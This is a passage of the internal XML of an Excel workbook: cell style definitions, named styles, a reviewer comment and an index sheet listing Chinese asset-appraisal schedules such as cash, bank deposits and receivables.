      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="177" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="10" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="176" fontId="26" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="8" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="165" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="172" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="173" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="173" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="172" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="23" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="178" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="175" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="177" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="8" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="10" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="12" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="11" pivotButton="0" quotePrefix="0" xfId="0"/>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="124">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="166" fontId="19" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="18" fillId="0" borderId="8" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="24" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="166" fontId="23" fillId="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18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="125">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="166" fontId="24" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="176" fontId="23" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center"/>
    </xf>
    <xf numFmtId="168" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" wrapText="1" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="170" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="176" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="168" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="174" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="1">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="171" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="10" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="169" fontId="2" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="167" fontId="19" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="1" hidden="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="170" fontId="0" fillId="0" borderId="0" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="9" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="right" vertical="center" shrinkToFit="1"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="167" fontId="20" fillId="0" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="20" fillId="0" borderId="9" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="center" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="167" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="169" fontId="18" fillId="0" borderId="11" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="0">
      <alignment horizontal="left" vertical="center" shrinkToFit="1"/>
    </xf>
    <xf numFmtId="164" fontId="10" fillId="6" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="7" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="right"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="10" fillId="5" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="12" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="165" fontId="13" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="centerContinuous"/>
    </xf>
    <xf numFmtId="165" fontId="10" fillId="7" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="14" fillId="7" borderId="7" applyAlignment="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="165" fontId="15" fillId="5" borderId="7" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="165" fontId="10" fillId="5" borderId="7" applyAlignment="1" applyProtection="1" pivotButton="0" quotePrefix="0" xfId="126">
      <alignment horizontal="right"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="165" fontId="0" fillId="6" borderId="0" pivotButton="0" quotePrefix="0" xfId="126"/>
    <xf numFmtId="43" fontId="0" fillId="6" borderId="0" pivotButton="0" quotePrefix="0" xfId="136"/>
  </cellXfs>
  <cellStyles count="14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" xfId="49"/>
    <cellStyle name="@_text" xfId="50"/>
    <cellStyle name="_long term loan - others 300504_(中企华)审计评估联合申报明细表.V1" xfId="51"/>
    <cellStyle name="_资产评估表（2007新准则版）-洋" xfId="52"/>
    <cellStyle name="{Comma [0]}" xfId="53"/>
    <cellStyle name="{Comma}" xfId="54"/>
    <cellStyle name="{Date}" xfId="55"/>
    <cellStyle name="{Month}" xfId="56"/>
    <cellStyle name="{Percent}" xfId="57"/>
    <cellStyle name="{Thousand [0]}" xfId="58"/>
    <cellStyle name="{Thousand}" xfId="59"/>
    <cellStyle name="{Z'0000(1 dec)}" xfId="60"/>
    <cellStyle name="{Z'0000(4 dec)}" xfId="61"/>
    <cellStyle name="args.style" xfId="62"/>
    <cellStyle name="Calc Currency (0)" xfId="63"/>
    <cellStyle name="category" xfId="64"/>
    <cellStyle name="Column Headings" xfId="65"/>
    <cellStyle name="Column$Headings" xfId="66"/>
    <cellStyle name="Column_Title" xfId="67"/>
    <cellStyle name="Comma  - Style3" xfId="68"/>
    <cellStyle name="Comma [0]_laroux" xfId="69"/>
    <cellStyle name="Comma_02(2003.12.31 PBC package.040304)" xfId="70"/>
    <cellStyle name="comma-d" xfId="71"/>
    <cellStyle name="Copied" xfId="72"/>
    <cellStyle name="COST1" xfId="73"/>
    <cellStyle name="Currency [0]_353HHC" xfId="74"/>
    <cellStyle name="Currency_353HHC" xfId="75"/>
    <cellStyle name="Date" xfId="76"/>
    <cellStyle name="Entered" xfId="77"/>
    <cellStyle name="entry box" xfId="78"/>
    <cellStyle name="Euro" xfId="79"/>
    <cellStyle name="Format Number Column" xfId="80"/>
    <cellStyle name="Grey" xfId="81"/>
    <cellStyle name="HEADER" xfId="82"/>
    <cellStyle name="Header1" xfId="83"/>
    <cellStyle name="Header2" xfId="84"/>
    <cellStyle name="Input [yellow]" xfId="85"/>
    <cellStyle name="Input Cells" xfId="86"/>
    <cellStyle name="InputArea" xfId="87"/>
    <cellStyle name="jktitle" xfId="88"/>
    <cellStyle name="KPMG Heading 1" xfId="89"/>
    <cellStyle name="KPMG Heading 2" xfId="90"/>
    <cellStyle name="KPMG Heading 3" xfId="91"/>
    <cellStyle name="KPMG Heading 4" xfId="92"/>
    <cellStyle name="Lines Fill" xfId="93"/>
    <cellStyle name="Linked Cells" xfId="94"/>
    <cellStyle name="Milliers [0]_!!!GO" xfId="95"/>
    <cellStyle name="Milliers_!!!GO" xfId="96"/>
    <cellStyle name="Model" xfId="97"/>
    <cellStyle name="Monétaire [0]_!!!GO" xfId="98"/>
    <cellStyle name="Monétaire_!!!GO" xfId="99"/>
    <cellStyle name="New Times Roman" xfId="100"/>
    <cellStyle name="NewStyle" xfId="101"/>
    <cellStyle name="no dec" xfId="102"/>
    <cellStyle name="Normal - Style1" xfId="103"/>
    <cellStyle name="Normalny_Arkusz1" xfId="104"/>
    <cellStyle name="Œ…‹æØ‚è [0.00]_Region Orders (2)" xfId="105"/>
    <cellStyle name="Œ…‹æØ‚è_Region Orders (2)" xfId="106"/>
    <cellStyle name="per.style" xfId="107"/>
    <cellStyle name="Percent [2]" xfId="108"/>
    <cellStyle name="Percent_PICC package Sept2002 (V120021005)1" xfId="109"/>
    <cellStyle name="Prefilled" xfId="110"/>
    <cellStyle name="pricing" xfId="111"/>
    <cellStyle name="PSChar" xfId="112"/>
    <cellStyle name="RevList" xfId="113"/>
    <cellStyle name="Sheet Head" xfId="114"/>
    <cellStyle name="style" xfId="115"/>
    <cellStyle name="style1" xfId="116"/>
    <cellStyle name="style2" xfId="117"/>
    <cellStyle name="subhead" xfId="118"/>
    <cellStyle name="Subtotal" xfId="119"/>
    <cellStyle name="常规 10" xfId="120"/>
    <cellStyle name="常规 2" xfId="121"/>
    <cellStyle name="常规 3" xfId="122"/>
    <cellStyle name="常规_Sheet1" xfId="123"/>
    <cellStyle name="常规_存货" xfId="124"/>
    <cellStyle name="常规_评估空白套表1" xfId="125"/>
    <cellStyle name="常规_新准则版明细表-新" xfId="126"/>
    <cellStyle name="分级显示行_1_4附件二凯旋评估表" xfId="127"/>
    <cellStyle name="公司标准表" xfId="128"/>
    <cellStyle name="霓付 [0]_97MBO" xfId="129"/>
    <cellStyle name="霓付_97MBO" xfId="130"/>
    <cellStyle name="烹拳 [0]_97MBO" xfId="131"/>
    <cellStyle name="烹拳_97MBO" xfId="132"/>
    <cellStyle name="千分位[0]_ 白土" xfId="133"/>
    <cellStyle name="千分位_ 白土" xfId="134"/>
    <cellStyle name="千位[0]_ 应交税金审定表" xfId="135"/>
    <cellStyle name="千位分隔_新准则版明细表-新" xfId="136"/>
    <cellStyle name="钎霖_laroux" xfId="137"/>
    <cellStyle name="资产" xfId="138"/>
    <cellStyle name="콤마 [0]_BOILER-CO1" xfId="139"/>
    <cellStyle name="콤마_BOILER-CO1" xfId="140"/>
    <cellStyle name="표준_0N-HANDLING " xfId="141"/>
    <cellStyle name="표준_kc-elec system check list" xfId="142"/>
  </cellStyles>
  <dxfs count="4">
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor theme="3" tint="0.799951170384838"/>
        </patternFill>
      </fill>
    </dxf>
    <dxf>
      <fill>
        <patternFill patternType="solid">
          <bgColor theme="0" tint="-0.1498764000366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0499893185216834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styles" Target="styles.xml" Id="rId113"/><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml" Id="rId114"/></Relationships>
</file>

<file path=xl/comments/comment1.xml><?xml version="1.0" encoding="utf-8"?>
<comments xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <authors>
    <author>chenjie</author>
  </authors>
  <commentList>
    <comment ref="D7" authorId="0" shapeId="0">
      <text>
        <t>chenjie:
如“砖、钢筋砼、钢结构、砖铁栏杆、砼面、沥青面、砖面”等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6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M105"/>
  <sheetViews>
    <sheetView topLeftCell="A8" workbookViewId="0">
      <selection activeCell="I25" sqref="I25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="29.1666666666667" customWidth="1" style="518" min="1" max="1"/>
    <col width="9" customWidth="1" style="518" min="2" max="16384"/>
  </cols>
  <sheetData>
    <row r="2">
      <c r="A2" s="519" t="inlineStr">
        <is>
          <t>0-其他方法结论</t>
        </is>
      </c>
      <c r="C2" s="519" t="inlineStr">
        <is>
          <t>0-其他方法结论</t>
        </is>
      </c>
      <c r="L2" s="518" t="n">
        <v>23</v>
      </c>
      <c r="M2" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="3">
      <c r="A3" s="519" t="inlineStr">
        <is>
          <t>1-汇总表</t>
        </is>
      </c>
      <c r="C3" s="518" t="inlineStr">
        <is>
          <t>资产评估结果汇总表</t>
        </is>
      </c>
      <c r="L3" s="518" t="n">
        <v>31</v>
      </c>
      <c r="M3" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="4">
      <c r="A4" s="519" t="inlineStr">
        <is>
          <t>2-分类汇总</t>
        </is>
      </c>
      <c r="C4" s="518" t="inlineStr">
        <is>
          <t>资产评估结果分类汇总表</t>
        </is>
      </c>
      <c r="L4" s="518" t="n">
        <v>65</v>
      </c>
      <c r="M4" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="5">
      <c r="A5" s="519" t="inlineStr">
        <is>
          <t>3-流动资产汇总</t>
        </is>
      </c>
      <c r="C5" s="518" t="inlineStr">
        <is>
          <t>流动资产评估汇总表</t>
        </is>
      </c>
      <c r="L5" s="518" t="n">
        <v>26</v>
      </c>
      <c r="M5" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="6">
      <c r="A6" s="519" t="inlineStr">
        <is>
          <t>3-辅-流动资产汇总</t>
        </is>
      </c>
      <c r="C6" s="165" t="inlineStr">
        <is>
          <t>流动资产余额评估汇总表</t>
        </is>
      </c>
      <c r="L6" s="518" t="n">
        <v>30</v>
      </c>
      <c r="M6" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="7">
      <c r="A7" s="519" t="inlineStr">
        <is>
          <t>3-1货币资金汇总表</t>
        </is>
      </c>
      <c r="C7" s="518" t="inlineStr">
        <is>
          <t>货币资金评估汇总表</t>
        </is>
      </c>
      <c r="L7" s="518" t="n">
        <v>23</v>
      </c>
      <c r="M7" s="518" t="n">
        <v>8</v>
      </c>
    </row>
    <row r="8">
      <c r="A8" s="519" t="inlineStr">
        <is>
          <t>3-1-1现金</t>
        </is>
      </c>
      <c r="C8" s="518" t="inlineStr">
        <is>
          <t>货币资金—现金评估明细表</t>
        </is>
      </c>
      <c r="L8" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M8" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="9">
      <c r="A9" s="519" t="inlineStr">
        <is>
          <t>3-1-2银行存款</t>
        </is>
      </c>
      <c r="C9" s="518" t="inlineStr">
        <is>
          <t>货币资金—银行存款评估明细表</t>
        </is>
      </c>
      <c r="L9" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M9" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="10">
      <c r="A10" s="519" t="inlineStr">
        <is>
          <t>3-1-3其他货币资金</t>
        </is>
      </c>
      <c r="C10" s="518" t="inlineStr">
        <is>
          <t>货币资金—其他货币资金评估明细表</t>
        </is>
      </c>
      <c r="L10" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M10" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="11">
      <c r="A11" s="519" t="inlineStr">
        <is>
          <t>3-2交易性金融资产汇总</t>
        </is>
      </c>
      <c r="C11" s="518" t="inlineStr">
        <is>
          <t>交易性金融资产评估汇总表</t>
        </is>
      </c>
      <c r="L11" s="518" t="n">
        <v>24</v>
      </c>
      <c r="M11" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="12">
      <c r="A12" s="519" t="inlineStr">
        <is>
          <t>3-2-1-股票</t>
        </is>
      </c>
      <c r="C12" s="518" t="inlineStr">
        <is>
          <t>交易性金融资产—股票投资评估明细表</t>
        </is>
      </c>
      <c r="L12" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M12" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="13">
      <c r="A13" s="519" t="inlineStr">
        <is>
          <t>3-2-2-债券</t>
        </is>
      </c>
      <c r="C13" s="518" t="inlineStr">
        <is>
          <t>交易性金融资产—债券投资评估明细表</t>
        </is>
      </c>
      <c r="L13" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M13" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="14">
      <c r="A14" s="519" t="inlineStr">
        <is>
          <t>3-2-3-基金</t>
        </is>
      </c>
      <c r="C14" s="518" t="inlineStr">
        <is>
          <t>交易性金融资产—基金投资评估明细表</t>
        </is>
      </c>
      <c r="L14" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M14" s="518" t="n">
        <v>12</v>
      </c>
    </row>
    <row r="15">
      <c r="A15" s="519" t="inlineStr">
        <is>
          <t>3-3衍生金融资产</t>
        </is>
      </c>
      <c r="C15" s="518" t="inlineStr">
        <is>
          <t>衍生金融资产评估明细表</t>
        </is>
      </c>
      <c r="L15" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M15" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="16">
      <c r="A16" s="519" t="inlineStr">
        <is>
          <t>3-4应收票据</t>
        </is>
      </c>
      <c r="C16" s="518" t="inlineStr">
        <is>
          <t>应收票据评估明细表</t>
        </is>
      </c>
      <c r="L16" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M16" s="518" t="n">
        <v>10</v>
      </c>
    </row>
    <row r="17">
      <c r="A17" s="519" t="inlineStr">
        <is>
          <t>3-5应收账款</t>
        </is>
      </c>
      <c r="C17" s="518" t="inlineStr">
        <is>
          <t>应收账款评估明细表</t>
        </is>
      </c>
      <c r="L17" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M17" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="18">
      <c r="A18" s="519" t="inlineStr">
        <is>
          <t>3-6应收款项融资</t>
        </is>
      </c>
      <c r="C18" s="518" t="inlineStr">
        <is>
          <t>应收款项融资评估明细表</t>
        </is>
      </c>
      <c r="L18" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M18" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="19">
      <c r="A19" s="519" t="inlineStr">
        <is>
          <t>3-7预付款项</t>
        </is>
      </c>
      <c r="C19" s="518" t="inlineStr">
        <is>
          <t>预付款项评估明细表</t>
        </is>
      </c>
      <c r="L19" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M19" s="518" t="n">
        <v>13</v>
      </c>
    </row>
    <row r="20">
      <c r="A20" s="519" t="inlineStr">
        <is>
          <t>3-8其他应收款汇总</t>
        </is>
      </c>
      <c r="C20" s="518" t="inlineStr">
        <is>
          <t>其他应收款评估汇总表</t>
        </is>
      </c>
      <c r="L20" s="518" t="n">
        <v>26</v>
      </c>
      <c r="M20" s="518" t="n">
        <v>7</v>
      </c>
    </row>
    <row r="21">
      <c r="A21" s="520" t="inlineStr">
        <is>
          <t>3-8-1应收利息</t>
        </is>
      </c>
      <c r="C21" s="518" t="inlineStr">
        <is>
          <t>其他应收款—应收利息评估明细表</t>
        </is>
      </c>
      <c r="L21" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M21" s="518" t="n">
        <v>11</v>
      </c>
    </row>
    <row r="22">
      <c r="A22" s="519" t="inlineStr">
        <is>
          <t>3-8-2应收股利</t>
        </is>
      </c>
      <c r="C22" s="518" t="inlineStr">
        <is>
          <t>其他应收款—应收股利评估明细表</t>
        </is>
      </c>
      <c r="L22" s="518" t="n">
        <v>5</v>
      </c>
      <c r="M22" s="518" t="n">
        <v>9</v>
      </c>
    </row>
    <row r="23">
      <c r="A23" s="519" t="inlineStr">
        <is>
          <t>3-8-3其他应收款</t>
        </is>
      </c>
      <c r="C23" s="518" t="inlineStr">
        <is>
          <t>其他应收款—其他应收款评估明细表</t>
        </is>
      </c>
      <c r="L23" s="518" t="n">
        <v>5</v>
      </c>
